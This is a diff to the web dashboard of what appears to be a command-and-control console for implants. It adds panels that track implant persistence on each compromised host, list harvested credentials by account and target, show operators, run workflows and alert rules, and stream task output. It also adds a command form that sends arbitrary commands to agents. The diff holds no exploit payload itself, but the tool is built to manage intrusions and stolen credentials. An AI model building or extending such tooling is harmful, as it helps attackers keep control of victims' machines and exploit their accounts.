@@ -123,6 +123,79 @@
     <h2>reach</h2>
     <div id="reach"></div>
   </section>
+
+  <section>
+    <h2>persistence</h2>
+    <div class="scroll">
+      <table id="persistence">
+        <thead><tr><th>agent</th><th>host</th><th>user</th><th>technique</th><th>path</th><th>state</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2>vault</h2>
+    <div class="scroll">
+      <table id="credentials">
+        <thead><tr><th>agent</th><th>kind</th><th>account</th><th>target</th><th>source</th><th>confidence</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+    <div class="note">The values are not here: the vault shows the shape of the material, and the value is fetched on purpose.</div>
+  </section>
+
+  <section>
+    <h2>team</h2>
+    <div class="scroll">
+      <table id="operators">
+        <thead><tr><th>operator</th><th>role</th><th>focus</th><th>idle</th><th>state</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h2>workflows</h2>
+    <div class="scroll">
+      <table id="workflows">
+        <thead><tr><th>workflow</th><th>steps</th><th>runs</th><th>parameters</th><th></th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+    <div class="note" id="workflowNote">A workflow is a named sequence of steps; the run happens on the server.</div>
+  </section>
+
+  <section>
+    <h2>alert rules</h2>
+    <div class="scroll">
+      <table id="alerts">
+        <thead><tr><th>name</th><th>event</th><th>tag</th><th>agent</th><th>task kind</th><th>cooldown</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+    <form id="alertForm">
+      <input id="alertJson" placeholder='{"rules":[{"name":"offline","event":"agent.offline"}]}' size="60">
+      <button type="submit">save</button>
+    </form>
+    <div class="note">The rules are kept by the server; the ones in the configuration file are what it starts with.</div>
+  </section>
+
+  <section class="wide">
+    <h2>live output</h2>
+    <div class="scroll feed" id="output"></div>
+  </section>
+
+  <section class="wide">
+    <h2>command</h2>
+    <form id="rpcForm">
+      <input id="rpcCmd" placeholder="task.list" size="18">
+      <input id="rpcArgs" placeholder='{"agent":"web-01"}' size="46">
+      <button type="submit">run</button>
+    </form>
+    <div class="note">Every command the console may run is reachable here, with the role of the dashboard. The role table of the server decides what it may do.</div>
+    <pre id="rpcOut" class="dim"></pre>
+  </section>
 </main>
 
 <script>
@@ -131,6 +204,7 @@
   var token = localStorage.getItem("umbra.token") || "";
   var seq = 0;
   var feed = document.getElementById("feed");
+  var output = document.getElementById("output");
   var state = document.getElementById("state");
   var tokenBox = document.getElementById("token");
   tokenBox.value = token;
@@ -340,9 +414,147 @@
     });
   }
 
+  // The persistence of every host: where the implant lives and whether it
+  // will still be there after a reboot.
+  function refreshPersistence() {
+    return api("/api/persistence").then(function (data) {
+      var body = document.querySelector("#persistence tbody");
+      body.innerHTML = "";
+      (data.hosts || []).forEach(function (host) {
+        var entries = host.entries || [];
+        if (!entries.length) {
+          var row = body.insertRow();
+          row.insertCell().textContent = host.agent_id;
+          row.insertCell().textContent = host.host || "";
+          row.insertCell().textContent = host.user || "";
+          row.insertCell().textContent = "-";
+          row.insertCell().textContent = "";
+          row.insertCell().textContent = host.persisted || "none";
+          return;
+        }
+        entries.forEach(function (entry, index) {
+          var row = body.insertRow();
+          if (index === 0) {
+            row.insertCell().textContent = host.agent_id;
+            row.insertCell().textContent = host.host || "";
+            row.insertCell().textContent = host.user || "";
+          } else {
+            row.insertCell().textContent = "";
+            row.insertCell().textContent = "";
+            row.insertCell().textContent = "";
+          }
+          row.insertCell().textContent = entry.technique || "";
+          row.insertCell().textContent = entry.path || "";
+          row.insertCell().textContent = entry.state || "";
+        });
+      });
+    });
+  }
+
+  // The vault: the shape of the material, never the value.
+  function refreshCredentials() {
+    return api("/api/credentials").then(function (data) {
+      var body = document.querySelector("#credentials tbody");
+      body.innerHTML = "";
+      (data.credentials || []).forEach(function (record) {
+        var row = body.insertRow();
+        row.insertCell().textContent = record.agent_id || "";
+        row.insertCell().textContent = record.kind || "";
+        row.insertCell().textContent = record.account || "";
+        row.insertCell().textContent = record.target || "";
+        row.insertCell().textContent = record.source || "";
+        row.insertCell().textContent = record.confidence || "";
+      });
+    });
+  }
+
+  // The presence of the team: who is here, and who went quiet.
+  function refreshOperators() {
+    return api("/api/operators").then(function (data) {
+      var body = document.querySelector("#operators tbody");
+      body.innerHTML = "";
+      (data.operators || []).forEach(function (op) {
+        var row = body.insertRow();
+        row.insertCell().textContent = op.name || "";
+        row.insertCell().textContent = op.role || "";
+        row.insertCell().textContent = op.focus || "-";
+        row.insertCell().textContent = (op.idle_sec || 0) + "s";
+        row.insertCell().textContent = op.stale ? "stale" : (op.silent ? "silent" : "here");
+      });
+    });
+  }
+
+  // The workflow runner: the catalogue and the button that starts one.
+  function refreshWorkflows() {
+    return api("/api/workflows").then(function (data) {
+      var body = document.querySelector("#workflows tbody");
+      body.innerHTML = "";
+      (data.workflows || []).forEach(function (workflow) {
+        var row = body.insertRow();
+        row.insertCell().textContent = workflow.name || "";
+        row.insertCell().textContent = (workflow.steps || []).length;
+        row.insertCell().textContent = workflow.runs || 0;
+        row.insertCell().textContent = (workflow.params || []).join(", ");
+        var button = document.createElement("button");
+        button.textContent = "run";
+        button.addEventListener("click", function () {
+          var params = {};
+          (workflow.params || []).forEach(function (name) {
+            var value = window.prompt("parameter " + name, "");
+            if (value) { params[name] = value; }
+          });
+          api("/api/workflow", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ name: workflow.name, params: params })
+          }).then(function (answer) {
+            document.getElementById("workflowNote").textContent =
+              "started " + (answer.run_id || workflow.name);
+          });
+        });
+        row.insertCell().appendChild(button);
+      });
+    });
+  }
+
+  // The alert rules editor: the rules the server watches the journal with.
+  function refreshAlerts() {
+    return api("/api/alerts").then(function (data) {
+      var body = document.querySelector("#alerts tbody");
+      body.innerHTML = "";
+      (data.rules || []).forEach(function (rule) {
+        var row = body.insertRow();
+        row.insertCell().textContent = rule.name || "";
+        row.insertCell().textContent = rule.event || "";
+        row.insertCell().textContent = rule.tag || "";
+        row.insertCell().textContent = rule.agent || "";
+        row.insertCell().textContent = rule.task_kind || "";
+        row.insertCell().textContent = rule.cooldown_sec || 0;
+      });
+    });
+  }
+
+  // The live output of the tasks: the answers as they arrive.
+  function refreshOutput() {
+    return api("/api/output?limit=25").then(function (data) {
+      (data.tasks || []).forEach(function (task) {
+        if (!task.out && !task.err) { return; }
+        var line = el("div");
+        line.appendChild(el("span", task.agent_id || "", "k"));
+        line.appendChild(document.createTextNode(" " + (task.kind || "") + " "));
+        line.appendChild(el("span", task.state || "", task.state === "done" ? "t" : "off"));
+        line.appendChild(document.createTextNode(" " + (task.out || task.err || "")));
+        output.insertBefore(line, output.firstChild);
+      });
+      while (output.childNodes.length > 120) { output.removeChild(output.lastChild); }
+    });
+  }
+
   function tick() {
     refreshAgents().then(refreshTasks).then(refreshStats).then(refreshEvents)
-      .then(refreshReach).catch(function (err) {
+      .then(refreshReach).then(refreshPersistence).then(refreshCredentials)
+      .then(refreshOperators).then(refreshWorkflows).then(refreshAlerts)
+      .then(refreshOutput).catch(function (err) {
         state.textContent = "error: " + err.message;
         state.className = "off";
       });
@@ -354,6 +566,50 @@
     state.textContent = "connected";
     state.className = "on";
     tick();
+  });
+
+  document.getElementById("rpcForm").addEventListener("submit", function (ev) {
+    ev.preventDefault();
+    var args = {};
+    var raw = document.getElementById("rpcArgs").value.trim();
+    if (raw) {
+      try {
+        args = JSON.parse(raw);
+      } catch (err) {
+        document.getElementById("rpcOut").textContent = "the arguments are not valid json";
+        return;
+      }
+    }
+    api("/api/rpc", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cmd: document.getElementById("rpcCmd").value.trim(), args: args })
+    }).then(function (answer) {
+      document.getElementById("rpcOut").textContent = JSON.stringify(answer.data, null, 2);
+    }).catch(function (err) {
+      document.getElementById("rpcOut").textContent = err.message;
+    });
+  });
+
+  document.getElementById("alertForm").addEventListener("submit", function (ev) {
+    ev.preventDefault();
+    var body;
+    try {
+      body = JSON.parse(document.getElementById("alertJson").value || "{}");
+    } catch (err) {
+      state.textContent = "the rules are not valid json";
+      state.className = "off";
+      return;
+    }
+    api("/api/alerts", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body)
+    }).then(function () {
+      state.textContent = "the rules were saved";
+      state.className = "on";
+      refreshAlerts();
+    });
   });
 
   document.getElementById("taskForm").addEventListener("submit", function (ev) {
